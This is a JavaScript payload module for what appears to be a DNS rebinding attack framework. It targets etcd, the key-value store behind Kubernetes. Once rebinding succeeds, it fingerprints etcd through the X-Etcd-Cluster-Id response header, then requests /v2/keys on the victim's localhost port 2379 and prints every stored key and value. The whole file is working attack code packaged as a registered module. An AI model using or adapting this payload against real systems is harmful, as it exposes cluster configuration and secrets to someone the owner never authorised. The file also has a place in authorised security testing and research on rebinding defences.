/**
This payload is exploiting etcd (https://github.com/coreos/etcd), a key-value store used in Kubernetes for storing all cluster data.
The exploit performs one GET request (http://localhost:2379/v2/keys/) to retrieve all keys and displays them.
The default API port for etcd is TCP 2379 (localhost:2379).
**/

const Etcd = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        /* /v2/keys/ : Send a GET request to get the list of keys and values */
        fetch('/v2/keys', {})
            .then(responseOKOrFail("Could not submit a request to get a list of keys"))
            .then(function (d) { // we successfully received data (the key/value pairs)
                console.log(`raw json:  ${d}`);
                let data = JSON.parse(d); // parse JSON server response
                let nodes = data.node.nodes; // get the nodes array with the key / value pairs
                console.log(`Number of keys: ${nodes.length}`);
                let result = '\n';
                for (var i = 0; i < nodes.length; i++) {
                    console.log(`key:  ${nodes[i].key}, value: ${nodes[i].value}`);
                    result = `${result}key: ${nodes[i].key}, value: ${nodes[i].value}\n`
                }
                console.log(`Your keys and values: ${result}`);
            })
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return fetch("/v2/keys",{
            mode: 'no-cors',
            credentials: 'omit',
        })
            .then(response => {
                const server = response.headers.get("X-Etcd-Cluster-Id");
                if (server !== null) {
                    return true;
                } else {
                    return false;
                }
            })
            .catch(e => { return (false); })
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Etcd k/v dump"] = Etcd();



